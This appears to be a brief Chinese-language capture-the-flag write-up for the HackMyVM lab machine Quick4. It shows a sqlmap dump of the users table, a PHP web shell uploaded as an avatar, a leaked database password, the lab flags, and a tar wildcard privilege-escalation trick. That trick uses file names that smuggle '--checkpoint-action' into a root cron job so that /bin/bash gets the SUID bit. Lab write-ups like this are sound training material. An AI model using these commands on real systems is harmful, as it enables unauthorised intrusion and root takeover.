# Quick4

2025.03.26 https://hackmyvm.eu/machines/machine.php?vm=Quick4

[video]()

## Ip

192.168.5.39

## Scan

```

```

登陆 http://192.168.5.39/customer/ 登陆不存在注入，注册个用户进去后也没利用点。

另外一个登陆点存在注入 http://192.168.5.39/employee/ sqlmap 直接跑出：

```
`quick`
sqlmap -r req.txt --flush-session --batch -D '`quick`' -T users --dump
```

得到 admin 用户的邮箱和密码，登陆 employee，可以修改头像，使用 BP 抓包，上传一个 php web shell，然后访问拿到反弹的 webshell。

先拿到数据库连接信息：

```
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');
```

直接在/home 下拿到 flag:

```
HMV{7920c4596aad1b9826721f4cf7ca3bf0}
```

crontab 发现每分钟执行脚本 /usr/local/bin/backup.sh

```
#!/bin/bash
cd /var/www/html/
tar czf /var/backups/backup-website.tar.gz *
```

这里可以利用 tar 提权：

```
cd /var/www/html/
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1

/bin/bash -p
```

拿到 root flag：

```
HMV{858d77929683357d07237ef3e3604597}
```
